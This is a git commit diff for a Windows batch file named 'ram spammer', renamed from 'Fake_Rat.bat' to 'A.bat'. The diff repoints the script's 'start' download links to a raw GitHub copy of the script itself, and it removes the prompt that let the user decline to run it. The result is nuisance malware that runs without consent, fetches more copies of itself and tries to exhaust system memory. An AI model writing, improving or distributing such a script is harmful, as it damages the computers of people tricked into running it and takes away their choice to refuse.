a2dbb7b30c6a9e9194c0134f795e47cd0f973fe8
NebulaModManager <152128444+BongBongWee@users.noreply.github.com>
2024-07-02 04:13:37 -0400

    Update and rename Fake_Rat.bat to A.bat

--- A.bat
+++ A.bat
@@ -2,10 +2,10 @@
 
 title ram spammer
 
-start https://cdn.discordapp.com/attachments/1188646022180765766/1190147767813816370/msg.vbs?ex=65a0be7b&is=658e497b&hm=d2c17e71584c60ed7be67185caac06c87632b29985f6342e936026f8e037962f&
+start https://raw.githubusercontent.com/BongBongWee/_/main/A.bat
 cls
 timeout /t 3 /nobreak >nul
-start https://cdn.discordapp.com/attachments/1188646022180765766/1190150656972038184/A.bat?ex=65a0c12c&is=658e4c2c&hm=703c28e597ce66df6072d14747bd712c6f785f75f27f00c278b11f12e2db736c&
+start https://raw.githubusercontent.com/BongBongWee/_/main/A.bat
 cls
 
 
@@ -13,20 +13,7 @@ cscript /nologo msg.vbs
 
 color 4
 echo FINAL WARNING!!!!!!
-echo Are you sure you want to run this program?
-choice /c:NY /n /m "Yes or No:"
 
-
-if errorlevel 1 set "key=N"
-if errorlevel 2 set "key=Y"
-
-if "%key%"=="N" (
-    echo Good choice
-    timeout /t 2 /nobreak >nul
-    exit
-) else (
-cls 
-:A
 echo YOU SHOULD HAVE CLICKED NO!!!
 timeout /t 1 /nobreak >nul
 color 14
